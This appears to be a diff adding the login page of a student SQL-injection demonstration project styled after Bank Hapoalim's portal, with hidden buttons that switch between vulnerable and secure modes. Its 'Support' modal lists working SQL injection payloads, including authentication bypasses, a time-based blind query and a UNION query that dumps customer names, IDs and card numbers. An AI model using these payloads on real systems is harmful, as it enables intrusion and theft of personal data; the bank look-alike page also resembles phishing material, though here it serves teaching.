@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Hapoalim - Login Portal</title>
+    <link rel="icon" type="image/png" href="logo_small.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <button class="secret-btn" id="vulnerable-trigger" title="Enable Vulnerable Mode"></button>
+    <button class="secret-btn" id="secure-trigger" title="Enable Secure Mode"></button>
+
+    <header>
+        <div class="header-left">
+            <img src="logo.png" alt="Bank Hapoalim" class="logo-img">
+        </div>
+        <div class="header-right">
+            <span class="nav-link" id="navSupport">⚙️ Support</span>
+            <span class="nav-link" id="navTerms">📍 Terms and conditions</span>
+        </div>
+    </header>
+
+    <main>
+        <div class="login-card">
+            <h2>Login</h2>
+            
+            <div id="login-error" class="error-message">
+                <strong>Login Failed</strong><br>
+                The ID number or password you entered is incorrect.
+            </div>
+            
+            <form id="loginForm" action="/login-secure" method="POST" autocomplete="off">
+                <div class="input-group">
+                    <label>ID Number</label>
+                    <div class="input-wrapper">
+                        <input type="text" name="id_number" placeholder="Enter your ID number" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" name="password" placeholder="Enter your password" required>
+                    </div>
+                </div>
+                <a class="forgot-link">Forgot ID / Password</a>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+        </div>
+    </main>
+
+   <div class="modal-overlay" id="modalSupport">
+        <div class="modal-content">
+            <button class="modal-close" id="closeSupport">&times;</button>
+            <div class="modal-header">How to Use This Tool: SQL Injection Guide</div>
+            <div class="modal-body">
+                <h4 style="margin-top:0;">System Modes (The Secret Buttons)</h4>
+                <ul style="margin-bottom: 15px;">
+                    <li><b>Secure Mode:</b> Click on <b>Hila Korach</b> (left) to enable full protection.</li>
+                    <li><b>Vulnerable Mode:</b> Click on <b>Irena</b> (right) to enable SQL injections.</li>
+                </ul>                
+                <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
+
+                <h4>Optional Attack Scenarios (Vulnerable Mode Only):</h4>
+                
+                <h4>1. Regular Authentication (sanity check)</h4>
+                <p>ID: <code>374787521</code> Password: <code>pass1174</code></p>
+                
+                <h4>2. Auth Bypass (ID Comment)</h4>
+                <p>ID: <code>374787521' -- </code> Password: <code>[any]</code></p>
+                
+                <h4>3. Auth Bypass (Password Injection)</h4>
+                <p>ID: <code>374787521</code> Password: <code>' OR '1'='1</code></p>
+                
+                <h4>4. Time-Based Blind SQLi</h4>
+                <p>Password: <code>' OR (WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i < 5000000) SELECT count(*) FROM r) > 0 -- </code></p>
+                
+                <h4>5. Dashboard Forgery (UNION)</h4>
+                <p>Password: <code>' UNION SELECT '000', 'HACKED SYSTEM', 'N/A', 'N/A', 999999, '4580-0000-0000-0000', '12/99', '000' -- </code></p>
+                
+                <h4>6. Full Database Exfiltration</h4>
+                <p>Password: <code>' UNION SELECT '000', GROUP_CONCAT(full_name || ' | ' || id_number || ' | ' || credit_card_number),'N/A','N/A',0,'0','0','0' FROM customers -- </code></p>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modalTerms">
+        <div class="modal-content">
+            <button class="modal-close" id="closeTerms">&times;</button>
+            <div class="modal-header">Terms and Conditions</div>
+            <div class="modal-body">
+                <h3 style="color: #333; margin-bottom: 10px;">Network Security Project</h3>
+                <p><strong>Developed by:</strong> Dana Hadassi</p>
+                <p><strong>Topic:</strong> SQL Injection: Vulnerabilities and Secure website mode</p>
+                <p style="margin-top: 15px;">
+                    This application was developed as an educational demonstration of DB security flaws. 
+                    It illustrates the critical differences between unparameterized string concatenation and the 
+                    secure implementation of Parameterized Queries (Prepared Statements).
+                </p>
+                <p style="margin-top: 15px; font-size: 12px; color: #888;">
+                    * All customer data in this project are fictional and used for academic purposes.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast-notification"></div>
+    
+    <script src="login.js"></script>
+</body>
+</html>
